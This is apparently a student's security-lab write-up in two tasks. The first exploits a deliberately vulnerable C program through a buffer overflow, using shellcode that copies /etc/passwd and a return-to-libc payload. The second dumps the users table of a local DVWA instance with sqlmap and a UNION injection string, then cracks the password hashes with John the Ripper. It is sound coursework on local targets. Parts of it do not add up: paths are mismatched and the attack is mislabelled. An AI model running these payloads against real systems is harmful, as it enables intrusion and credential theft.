# Lab #1,22110046, Mai Duc Kien, INSE330380E_01FIE
# Task 1: Software buffer overflow attack
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>
void redundant_code(char* p)
{
    char local[256];
    strncpy(local,p,20);
	printf("redundant code\n");
}
int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode source in asm. This shellcode copy /etc/passwd to /tmp/pwfile
```
global _start
section .text
_start:
    xor eax,eax
    mov al,0x5
    xor ecx,ecx
    push ecx
    push 0x64777373 
    push 0x61702f63
    push 0x74652f2f
    lea ebx,[esp +1]
    int 0x80

    mov ebx,eax
    mov al,0x3
    mov edi,esp
    mov ecx,edi
    push WORD 0xffff
    pop edx
    int 0x80
    mov esi,eax

    push 0x5
    pop eax
    xor ecx,ecx
    push ecx
    push 0x656c6966
    push 0x74756f2f
    push 0x706d742f
    mov ebx,esp
    mov cl,0102o
    push WORD 0644o
    pop edx
    int 0x80

    mov ebx,eax
    push 0x4
    pop eax
    mov ecx,edi
    mov edx,esi
    int 0x80

    xor eax,eax
    xor ebx,ebx
    mov al,0x1
    mov bl,0x5
    int 0x80

```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.<br>
**Answer 1**


### 1. Build image Run Docker
```
docker build -t img4lab .
```
```
docker run -it --privileged -v $HOME/seclabs:/home/seed/seclabs img4lab
```
![Screenshot 2024-10-21 083918](https://github.com/user-attachments/assets/b8ccbc09-5ff8-424e-bd36-c8b4a0c86ae8)
### 2. Compile asm program and c program

```
nasm -f elf32 -o lab1.o lab1.asm
```
```
ld -m elf_i386 -o lab1 lab1.o
```
```
gcc vullab1.c -o vullab1.out -fno-stack-protector -mpreferred-stack-boundary=2
```
![image](https://github.com/user-attachments/assets/82f4142d-6425-4873-82b9-7268a50f61c2)



### 3. Before doing this lab, we have to turn off ASLR (Address Space Layout Randomization)
```
sudo sysctl -w kernel.randomize_va_space=0
```
![image](https://github.com/user-attachments/assets/948e6588-a50f-4789-95e8-f61a7220a3c2)


### 4. Now we create an environment variable in Linux with the path of file lab1.asm
```
nasm -g -f elf lab1.asm
ld -m elf_i386 -o lab1 lab1.o
pwd -> /home/seed/seclabs/bof
export exploit_path="/seclabs/bof/file_del"
```
![image](https://github.com/user-attachments/assets/4bdb34cd-9bc4-44c7-8587-1a812d3e7ae8)
![image](https://github.com/user-attachments/assets/6920c002-706d-46f6-8f61-6c2152812483)

### 5.Stack Frame

![image](https://github.com/user-attachments/assets/f207d112-107d-4f72-9fe7-e85117ab4b8b)

If we want to exploit

20 bytes to overwrite buf and ebp <br>
4 bytes to overwrite ret addr of vuln with the address of system <br>
4 bytes for the address of exit <br>
4 bytes for argument of system (exploit path that we created before) <br>

```
r $(python -c "print(20*'a' + 'address of system' + 'address of exit' + 'address of env var')")
```

### 6. Use gdb

Use gdb for this c program

```
gdb -q vullab1.out
```
Start the code
```
start
```
Print out the address of those things
```
print system
print exit
find /home/seed/seclabs/bof/vullab1
```

![image](https://github.com/user-attachments/assets/abc8086a-e280-44ef-afdc-60bedb4bca65)


0xf7e50db0: Address of libc_system<br>
0xf7e449e0: Address of exit to avoid crashing <br>
0xffffd914: Address of env variable <br>

### 7. Attack File

Before attack
<br>
![image](https://github.com/user-attachments/assets/00601137-8fcc-4e22-830d-f8f90c4d28cf)

The attack start
```
gdb -q vullab1.out
```
```
r $(python -c "print(20*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x14\xd9\xff\xff')")
```

![image](https://github.com/user-attachments/assets/e9b06db2-1738-4674-a04d-526309f9d79d)


After that, we use the code below to read file we have just copied
```
cat /tmp/outfile
```


After attacking, we see that the asm program copy /etc/passwd to /tmp/outfile, not /tmp/pwfile

**Conclusion**: The buffer overflow vulnerability in the C program was successfully exploited using shellcode injection.




# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup.
## Setup lab
### 1. Setup dwa

```
git clone https://github.com/digininja/DVWA
```
Run Docker
```
docker-compose up -d
```
### 2. Setup sqlmap

```
git clone https://github.com/sqlmapproject/sqlmap
```
### Localhost : http://localhost:4280/security.php
![image](https://github.com/user-attachments/assets/40c856df-07ac-4798-8f11-42adb64d8bc7)


### 1. Login
User : admin <br>
Password: password <br>
![image](https://github.com/user-attachments/assets/df50f280-f82f-43d4-8ba7-672297eeb16b)


### 2. Get cookies

![image](https://github.com/user-attachments/assets/8309fd16-9816-4ab3-a9ff-c21f58b105f5)

![image](https://github.com/user-attachments/assets/d61bfb48-94e2-463d-a946-660cccae2803)


### 3. Attack
**Question 1**: Use sqlmap to get information about all available databases
<br>
**Answer 1**:
Use the command below to get information about all available databases
<br>
Before Attack
![image](https://github.com/user-attachments/assets/c62b7d66-d79e-4b9f-b71c-2857f7a47a04)


```
python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" --dbs
```
Result
![image](https://github.com/user-attachments/assets/73f98421-17f6-48e6-beac-eb6120d7dc8f)

![image](https://github.com/user-attachments/assets/ac7f1d6c-f5e1-433e-87d2-d4a3ea33ac63)



**Question 2**: Use sqlmap to get tables, users information

**Answer 2**:
<br>
Before Attack
![image](https://github.com/user-attachments/assets/503d942b-fbb9-495e-afd0-6cc4131f58d6)



```
python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" -D dvwa --tables
```
Result
![image](https://github.com/user-attachments/assets/2115aafc-d34b-4bef-8d16-b6ce64b7cd2d)

![image](https://github.com/user-attachments/assets/4273d2fd-2537-497d-b961-1445f593d8c4)


**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
<br>
**Answer 3**:
### 1. Attack by sqlinjection code or sqlmap
### 1.1 Attack by sqlmap
```
python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=d36a2766916be89ecb1e34c02b94f95c; security=low" -D dvwa -T users --dump
```
![image](https://github.com/user-attachments/assets/bf35e4a2-632a-4bcc-90f3-cf9b550dc037)

<br>
Result 
<br>

![Screenshot 2024-10-22 150935](https://github.com/user-attachments/assets/6a3e2d09-c5f4-4cd1-830e-4cc53b21f14c)


Any Password is by hashed MD5 such as **8d3533d75ae2c3966d7e0d4fcc69216b**


### 1.2 Attack by sqlinjection code
```
' UNION SELECT user, password FROM users #
```
![Screenshot 2024-10-21 162619](https://github.com/user-attachments/assets/b34ce254-0e55-47c0-b24f-4032079409f7)

In First Name is username and Sure Name is password hashed by MD5 or SHA256
### 2. Run John Ripper to crack file hash
Create file hash.txt <br>
![image](https://github.com/user-attachments/assets/8e4e32f4-9d73-4195-9260-7e7924a62301)


```
./john --format=raw-md5 hash.txt
```

Beside John Ripper, We can crack hashed by https://crackstation.net/

### 3. Show the password to crack
We can run John Ripper or website above
```
./john --show --format=raw-md5 hash.txt
```
this is result run by john ripper
![image](https://github.com/user-attachments/assets/0e1ed617-19fd-4581-b718-85aaa46852a0)

This is result run by website
![image](https://github.com/user-attachments/assets/35feeec9-64c0-440d-9901-d41191151fcb)

This is result run by sqlmap
![Screenshot 2024-10-22 150919](https://github.com/user-attachments/assets/d4a128f8-5c16-45da-8240-3e469c33193d)


### 4.Login website 

**UserName : pablo**
<br>
**Password : letmein**

![image](https://github.com/user-attachments/assets/9b4f0651-d958-4338-a099-0fc55cf1154e)
<br>
We can see the user pablo
<br>
![image](https://github.com/user-attachments/assets/3c86df18-1a2a-456b-ac23-01bd72ad0f78)

**Conclusion**: The vulnerability website was successfully exploited using sqlmap and sqlInjection code.























































